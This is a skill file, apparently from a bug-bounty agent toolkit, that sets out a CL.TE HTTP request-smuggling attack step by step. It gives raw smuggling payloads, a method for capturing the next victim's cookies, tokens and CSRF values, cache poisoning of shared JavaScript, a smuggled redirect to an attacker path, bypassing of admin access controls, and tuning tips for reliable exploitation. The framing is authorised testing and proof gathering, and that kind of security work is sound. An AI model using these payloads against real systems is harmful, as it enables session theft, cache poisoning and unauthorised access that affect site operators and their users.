---
name: attack-smuggling-cl-te
description: "CL.TE desync — front-end trusts Content-Length, back-end trusts Transfer-Encoding; detection, confirmation, capture and poison primitives"
category: "web-application"
version: "1.0"
author: "bountyreper-official"
tags:
  - request-smuggling
  - cl-te
  - desync
tech_stack:
  - web
cwe_ids:
  - CWE-444
chains_with:
  - attack-request-smuggling
  - attack-cache-poison
prerequisites:
  - attack-request-smuggling
---

# CL.TE Smuggling

## Objective

Front-end uses Content-Length; back-end uses Transfer-Encoding. Everything after the
chunked body terminator becomes the back-end's NEXT request — you choose what it is.

## Methodology

### 1. Confirm with a differential (not just timing)

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X: X
```

Two requests in one connection:
- Normal response = your `/` 200
- The OTHER response = the smuggled `/404` (back-end parsed your payload as its request)

Both responses in one connection read = desync CONFIRMED.

### 2. Capture the next user's request (classic primitive)

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 250
Transfer-Encoding: chunked

0

GET /response-capture HTTP/1.1     ← YOUR capture path that reflects the request
```

The next real user's request (cookies, tokens, CSRF) becomes the BODY of your capture
request — reflected back on your next view of that path.

### 3. Exploit primitives (pick by goal)

- Auth capture → `/response-capture` reflects next victim's `Cookie:`
- Cache poison → smuggle `GET /static/app.js` with your payload → everyone's cache
- Redirect trap → smuggle `GET //attacker/ HTTP/1.1` (open-redirect target)
- Admin bypass → smuggle requests to internal-only paths (front-end ACL only sees first)

### 4. Stability rules

- One victim per smuggle — re-target between attempts or you poison your own connection
- Content-Length must EXCEED the actual front-end body, but the back must still parse
  chunked body cleanly — tune the CL number until the differential shows
- Connection reuse is required: two requests, same socket (use `nc` or raw TLS tooling)

## Proof

- The two-response differential (headers show your smuggled request hitting the back-end)
- For capture: the captured victim request with REDACTED credentials
- For poison: cached response served to a different client

## Notes

- Some front-ends normalize CL+TE together (403 both headers) → go TE.TE sub-skill
